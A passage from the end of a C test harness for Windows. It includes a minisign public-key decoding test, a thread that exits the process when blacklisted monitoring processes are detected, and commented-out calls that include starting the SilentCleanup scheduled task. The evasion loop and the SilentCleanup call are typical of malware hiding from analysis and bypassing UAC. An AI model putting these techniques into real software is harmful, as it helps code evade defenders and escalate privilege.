}

void test41() {
	CHAR szInpit[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
	PMINISIGN_PUB_KEY pResult = NULL;
	pResult = DecodeMinisignPublicKey(szInpit);
	HexDump(pResult, sizeof(MINISIGN_PUB_KEY));
	FREE(pResult);
}

VOID DetectMonitorSystem() {
	while (TRUE) {
		if (CheckForBlackListProcess()) {
			ExitProcess(-1);
		}

		Sleep(1000);
	}
}

VOID TestFinal() {
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;

	hThread = CreateThread(NULL, 0, DetectMonitorSystem, NULL, 0, &dwThreadId);
	if (hThread == NULL) {
		LogError(L"CreateThread failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}


CLEANUP:
	if (hThread != NULL) {
		CloseHandle(hThread);
	}
}

int main() {
	//StartTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
	//test1();
	//test2(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test3(L"C:\\Users\\Admin\\Desktop\\LogProvider.dll");
	//test6();
	//test7();
	//test8();
	//test9();
	//test10();
	//test11();
	//test12();
	//test13();
	//test14();
	//test15();
	//test16();
	//test17();
	//test18();
	//test19();
	//test20();
	//test21("C:\\Windows\\System32\\cmd.exe");
	//test22();
	//test23();
	//test24();
	//test25();
	//test26();
	//test27();
	//test28();
	//test29();
	//test30();
	//test31();
	//test32();
	//test33();
	//test34();
	//test35();
	//test36();
	//test37();
	//test38();
	//test39();
	//test40();
	test41();
	return 0;
}